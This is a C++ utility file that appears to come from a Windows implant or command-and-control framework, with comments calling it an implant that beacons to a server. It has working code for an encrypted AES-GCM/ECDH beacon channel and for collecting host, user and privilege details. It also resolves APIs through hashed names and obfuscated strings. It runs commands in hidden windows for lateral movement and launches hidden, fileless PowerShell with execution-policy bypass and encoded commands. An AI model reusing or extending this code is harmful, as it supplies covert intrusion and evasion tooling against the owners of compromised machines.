// utils.cpp — String conversion, Base64, AES-GCM + ECDH P-256 (BCrypt),
// SHA-256, system info, jitter sleep.
#include "utils.hpp"
#include "config.hpp"
#include "ghostcore.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <winternl.h>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <algorithm>
#include <lmcons.h>

#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#endif

// ---------------------------------------------------------------------------
// String conversion — WideChar <-> UTF-8
// ---------------------------------------------------------------------------

std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int sz = WideCharToMultiByte(CP_UTF8, 0,
                                 wstr.c_str(), static_cast<int>(wstr.size()),
                                 nullptr, 0, nullptr, nullptr);
    if (sz <= 0) return {};
    std::string out(static_cast<size_t>(sz), '\0');
    WideCharToMultiByte(CP_UTF8, 0,
                        wstr.c_str(), static_cast<int>(wstr.size()),
                        &out[0], sz, nullptr, nullptr);
    return out;
}

std::wstring UTF8ToWString(const std::string& utf8) {
    if (utf8.empty()) return {};
    int sz = MultiByteToWideChar(CP_UTF8, 0,
                                 utf8.c_str(), static_cast<int>(utf8.size()),
                                 nullptr, 0);
    if (sz <= 0) return {};
    std::wstring out(static_cast<size_t>(sz), L'\0');
    MultiByteToWideChar(CP_UTF8, 0,
                        utf8.c_str(), static_cast<int>(utf8.size()),
                        &out[0], sz);
    return out;
}

// ---------------------------------------------------------------------------
// Base64 — implemented in include/ghostcore.hpp so the strict decoder is
// unit-tested (tests/test_core.cpp); these are the Windows-facing wrappers.
// ---------------------------------------------------------------------------
std::string Base64Encode(const BYTE* data, size_t len) {
    return ghost::Base64Encode(data, len);
}

std::vector<BYTE> Base64Decode(const std::string& b64) {
    return ghost::Base64Decode(b64);
}

// ---------------------------------------------------------------------------
// AES-256-GCM encrypt via BCrypt.
// Wire format: [12-byte nonce][16-byte auth tag][ciphertext]
// Then Base64-encoded for JSON embedding.
// ---------------------------------------------------------------------------

std::string AesGcmEncrypt(const std::vector<BYTE>& key,
                          const std::string& plaintext) {
    if (key.size() != 32) return {};

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return {};

    // AES defaults to CBC in BCrypt. An unchecked failure here silently
    // encrypts under a mode the server never expects, so the beacon returns
    // garbage instead of surfacing a crypto-negotiation error. Fail closed.
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlg, &hKey, nullptr, 0,
            (PUCHAR)key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    // Random 12-byte nonce. GCM loses both confidentiality and authenticity
    // if a nonce ever repeats under the same key, so a failed RNG must abort
    // this beacon rather than fall through with the zero-filled buffer.
    BYTE nonce[12] = {};
    if (!BCRYPT_SUCCESS(BCryptGenRandom(nullptr, nonce, 12,
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BYTE tag[16] = {};
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce  = nonce;
    authInfo.cbNonce  = 12;
    authInfo.pbTag    = tag;
    authInfo.cbTag    = 16;

    // ponytail: AES-GCM output == input size — no padding, no sizing call needed.
    // The sizing call advances BCrypt's internal GCM counter before the real encrypt,
    // producing a ciphertext with a tag that verifies nothing on the other side.
    const ULONG cbPlaintext = static_cast<ULONG>(plaintext.size());
    // Never size the buffer to zero: an empty plaintext would hand BCrypt a
    // NULL pbOutput, which is the sizing call forbidden above. The scratch byte
    // keeps the pointer valid; cbResult still comes back 0.
    std::vector<BYTE> ciphertext(cbPlaintext ? cbPlaintext : 1);
    ULONG cbResult = 0;
    NTSTATUS st = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext.data(), cbPlaintext,
        &authInfo, nullptr, 0,
        ciphertext.data(), static_cast<ULONG>(ciphertext.size()), &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return {};

    // Concatenate: nonce || tag || ciphertext
    std::vector<BYTE> wire;
    wire.reserve(12 + 16 + cbResult);
    wire.insert(wire.end(), nonce, nonce + 12);
    wire.insert(wire.end(), tag, tag + 16);
    wire.insert(wire.end(), ciphertext.begin(), ciphertext.begin() + cbResult);

    return Base64Encode(wire.data(), wire.size());
}

// ---------------------------------------------------------------------------
// AES-256-GCM decrypt.
// Input: Base64-encoded wire [nonce:12][tag:16][ciphertext]
// ---------------------------------------------------------------------------

std::string AesGcmDecrypt(const std::vector<BYTE>& key,
                          const std::string& b64Wire) {
    if (key.size() != 32) return {};

    std::vector<BYTE> wire = Base64Decode(b64Wire);
    if (wire.size() < 12 + 16 + 1) return {};

    BYTE* nonce      = wire.data();
    BYTE* tag        = wire.data() + 12;
    BYTE* ciphertext = wire.data() + 28;
    ULONG ctLen      = static_cast<ULONG>(wire.size() - 28);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return {};

    // See the matching check in AesGcmEncrypt: without this the decrypt side
    // can run under CBC and report a plain tag-mismatch failure.
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlg, &hKey, nullptr, 0,
            (PUCHAR)key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag   = tag;
    authInfo.cbTag   = 16;

    std::vector<BYTE> plain(ctLen);
    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(
        hKey, ciphertext, ctLen, &authInfo,
        nullptr, 0,
        plain.data(), ctLen, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return {};
    return std::string(reinterpret_cast<char*>(plain.data()), cbResult);
}

// ---------------------------------------------------------------------------
// SHA-256 over raw bytes
// ---------------------------------------------------------------------------

// Returns an EMPTY vector on failure. Every step is checked because the only
// caller (EcdhDeriveSessionKey) validates the result by length. Pre-sizing the
// return to 32 zero bytes made a failed CryptAcquireContext look like a
// successful digest, so the implant would accept an all-zero channel key and
// beacon under a key anyone could reproduce.
std::vector<BYTE> Sha256Bytes(const BYTE* data, size_t len) {
    std::vector<BYTE> out;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT))
        return out;
    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        if (CryptHashData(hHash, const_cast<BYTE*>(data),
                          static_cast<DWORD>(len), 0)) {
            out.resize(32);
            DWORD cb = 32;
            if (!CryptGetHashParam(hHash, HP_HASHVAL, out.data(), &cb, 0) ||
                cb != 32)
                out.clear();
        }
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
    return out;
}

// ---------------------------------------------------------------------------
// Ephemeral ECDH P-256 key agreement (BCrypt)
//   Wire format: Base64( X[32] || Y[32] ), both coordinates big-endian —
//   the standard uncompressed-point encoding minus the 0x04 prefix. BCrypt
//   ECCKEY blobs store the coordinates little-endian, so each 32-byte half
//   is reversed on the way in and out. BCRYPT_KDF_RAW_SECRET ("TRUNCATE")
//   returns the shared secret little-endian; it is reversed before hashing
//   so both sides hash identical big-endian bytes.
// ---------------------------------------------------------------------------

// Some MinGW-w64 releases ship bcrypt.h without the ECC blob-type constants.
#ifndef BCRYPT_ECDH_PUBLIC_BLOB
#define BCRYPT_ECDH_PUBLIC_BLOB L"ECDHPUBLICBLOB"
#endif

static BOOL              g_EcdhReady = FALSE;
static BCRYPT_ALG_HANDLE g_EcdhAlg   = nullptr;
static BCRYPT_KEY_HANDLE g_EcdhPriv  = nullptr;
static std::string       g_EcdhPubB64;

static void Rev32(BYTE* p) {
    for (int i = 0; i < 16; ++i) std::swap(p[i], p[31 - i]);
}

BOOL EcdhInit() {
    if (g_EcdhReady) return TRUE;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &g_EcdhAlg, L"ECDH_P256", nullptr, 0)))
        return FALSE;

    if (!BCRYPT_SUCCESS(BCryptGenerateKeyPair(g_EcdhAlg, &g_EcdhPriv, 256, 0)) ||
        !BCRYPT_SUCCESS(BCryptFinalizeKeyPair(g_EcdhPriv, 0))) {
        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
        g_EcdhAlg = nullptr;
        return FALSE;
    }

    ULONG cb = 0;
    if (!BCRYPT_SUCCESS(BCryptExportKey(g_EcdhPriv, nullptr,
                                        BCRYPT_ECDH_PUBLIC_BLOB,
                                        nullptr, 0, &cb, 0)) ||
        cb < sizeof(BCRYPT_ECCKEY_BLOB) + 64) {
        BCryptDestroyKey(g_EcdhPriv);
        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
        g_EcdhPriv = nullptr; g_EcdhAlg = nullptr;
        return FALSE;
    }

    std::vector<BYTE> blob(cb);
    if (!BCRYPT_SUCCESS(BCryptExportKey(g_EcdhPriv, nullptr,
                                        BCRYPT_ECDH_PUBLIC_BLOB,
                                        blob.data(), cb, &cb, 0))) {
        BCryptDestroyKey(g_EcdhPriv);
        BCryptCloseAlgorithmProvider(g_EcdhAlg, 0);
        g_EcdhPriv = nullptr; g_EcdhAlg = nullptr;
        return FALSE;
    }

    // Blob: BCRYPT_ECCKEY_BLOB header + X(32, LE) + Y(32, LE)
    BYTE* xy = blob.data() + sizeof(BCRYPT_ECCKEY_BLOB);
    Rev32(xy);
    Rev32(xy + 32);                 // LE (BCrypt) → BE (wire)
    g_EcdhPubB64 = Base64Encode(xy, 64);
    g_EcdhReady  = TRUE;
    return TRUE;
}

std::string EcdhPublicKeyB64() {
    if (!g_EcdhReady) EcdhInit();
    return g_EcdhPubB64;
}

BOOL EcdhDeriveSessionKey(const std::string& serverPubB64,
                          std::vector<BYTE>& key32) {
    key32.clear();
    if (!g_EcdhReady && !EcdhInit()) return FALSE;

    std::vector<BYTE> xy = Base64Decode(serverPubB64);
    if (xy.size() != 64) return FALSE;
    Rev32(xy.data());
    Rev32(xy.data() + 32);          // BE (wire) → LE (BCrypt)

    std::vector<BYTE> blob(sizeof(BCRYPT_ECCKEY_BLOB) + 64);
    auto* hdr = reinterpret_cast<BCRYPT_ECCKEY_BLOB*>(blob.data());
    hdr->dwMagic = 0x314B4345;      // BCRYPT_ECDH_PUBLIC_P256_MAGIC
    hdr->cbKey   = 32;
    memcpy(blob.data() + sizeof(BCRYPT_ECCKEY_BLOB), xy.data(), 64);

    BCRYPT_KEY_HANDLE hPub = nullptr;
    if (!BCRYPT_SUCCESS(BCryptImportKeyPair(g_EcdhAlg, nullptr,
                                            BCRYPT_ECDH_PUBLIC_BLOB, &hPub,
                                            blob.data(),
                                            static_cast<ULONG>(blob.size()), 0)))
        return FALSE;

    BCRYPT_SECRET_HANDLE hSecret = nullptr;
    NTSTATUS st = BCryptSecretAgreement(g_EcdhPriv, hPub, &hSecret, 0);
    BCryptDestroyKey(hPub);
    if (!BCRYPT_SUCCESS(st)) return FALSE;

    ULONG cbSecret = 0;
    // BCryptDeriveKey(hSecret, kdf, pParameterList,
    //                 pbOutput, cbOutput, pcbResult, dwFlags)
    st = BCryptDeriveKey(hSecret, L"TRUNCATE", nullptr,
                         nullptr, 0, &cbSecret, 0);
    if (BCRYPT_SUCCESS(st) && cbSecret == 32) {
        std::vector<BYTE> raw(32);
        ULONG cbOut = 0;
        st = BCryptDeriveKey(hSecret, L"TRUNCATE", nullptr,
                             raw.data(), 32, &cbOut, 0);
        BCryptDestroySecret(hSecret);
        if (!BCRYPT_SUCCESS(st) || cbOut != 32) return FALSE;
        Rev32(raw.data());          // LE (BCrypt) → BE (matches server)
        key32 = Sha256Bytes(raw.data(), raw.size());
        return key32.size() == 32 ? TRUE : FALSE;
    }
    BCryptDestroySecret(hSecret);
    return FALSE;
}

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------

std::wstring GetHostnameHash() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameW(hostname, &size)) return L"00000000";

    uint32_t hash = 0x811c9dc5u;
    for (DWORD i = 0; i < size; ++i) {
        hash ^= static_cast<uint32_t>(hostname[i]);
        hash *= 0x01000193u;
    }

    std::wostringstream ss;
    ss << std::hex << std::setfill(L'0') << std::setw(8) << hash;
    return ss.str();
}

std::wstring GetUsername() {
    wchar_t user[UNLEN + 1] = {};
    DWORD size = UNLEN + 1;
    if (GetUserNameW(user, &size))
        return std::wstring(user, size > 0 ? size - 1 : 0);
    return L"unknown";
}

std::wstring GetHostname() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &size))
        return std::wstring(hostname, size);
    return L"unknown";
}

DWORD GetOSBuild() {
    typedef NTSTATUS(NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    auto fn = reinterpret_cast<RtlGetVersion_t>(
        GetProcAddress(ntdll, "RtlGetVersion"));
    if (!fn) return 0;
    RTL_OSVERSIONINFOW vi = {};
    vi.dwOSVersionInfoSize = sizeof(vi);
    return (fn(&vi) == 0) ? vi.dwBuildNumber : 0;
}

BOOL IsElevated() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_ELEVATION te = {};
    DWORD len = 0;
    BOOL result = FALSE;
    if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &len))
        result = te.TokenIsElevated;
    CloseHandle(hToken);
    return result;
}

// ---------------------------------------------------------------------------
// Jitter sleep — uniform distribution [minSec, maxSec]
// ---------------------------------------------------------------------------

VOID JitterSleep(DWORD minSec, DWORD maxSec) {
    if (minSec > maxSec) minSec = maxSec;

    // ponytail: CS + mt19937 in static storage, initialized once via pointer — no copy
    static CRITICAL_SECTION* cs = []() -> CRITICAL_SECTION* {
        static CRITICAL_SECTION s;
        InitializeCriticalSection(&s);
        return &s;
    }();
    static std::mt19937* gen = []() -> std::mt19937* {
        static std::mt19937 g([] {
            std::random_device rd;
            return rd() ^ static_cast<unsigned>(GetCurrentThreadId());
        }());
        return &g;
    }();

    DWORD seconds;
    EnterCriticalSection(cs);
    seconds = std::uniform_int_distribution<DWORD>(minSec, maxSec)(*gen);
    LeaveCriticalSection(cs);

    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfnDelay = nullptr;
    if (!pfnDelay) {
        HMODULE hNt = GetModuleHandleA(XS("ntdll.dll"));
        pfnDelay = reinterpret_cast<NtDelayExecution_t>(
            HashProc(hNt, FNV("NtDelayExecution")));
    }

    LONGLONG ms = static_cast<LONGLONG>(seconds) * 1000LL;
    if (pfnDelay) {
        LARGE_INTEGER li;
        li.QuadPart = -ms * 10000LL;
        pfnDelay(FALSE, &li);
    } else {
        Sleep(static_cast<DWORD>(ms));
    }
}
// ---------------------------------------------------------------------------
// Hidden process with captured output
// ---------------------------------------------------------------------------
// The pipe/read/wait core, lifted out of RunFilelessPS when the lateral
// movement vectors became a second caller (winrs, net, schtasks all need their
// stdout captured). The command line is passed verbatim, so callers own
// quoting.
std::wstring RunHiddenCapture(const std::wstring& cmdLine) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = nullptr; // no console in -mwindows build; NULL avoids INVALID_HANDLE crash

    std::wstring mutableCmd = cmdLine;   // CreateProcessW may write to the buffer
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &mutableCmd[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed, code " + std::to_wstring(GetLastError()) + L"]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// ---------------------------------------------------------------------------
// Fileless PowerShell runner
// ---------------------------------------------------------------------------
// Moved here from src/c2.cpp when the Defender module became a second caller.
// The command line is built at runtime (SystemRoot is not a build-time value)
// but contains no literal above the obfuscation threshold: powershell.exe is
// resolved under the system root and the script itself arrives Base64-encoded.
std::wstring RunFilelessPS(const std::string& b64Command) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    return RunHiddenCapture(L"\"" + ps + L"\" -NoProfile -NonInteractive "
                            L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                            L"-EncodedCommand " + UTF8ToWString(b64Command));
}
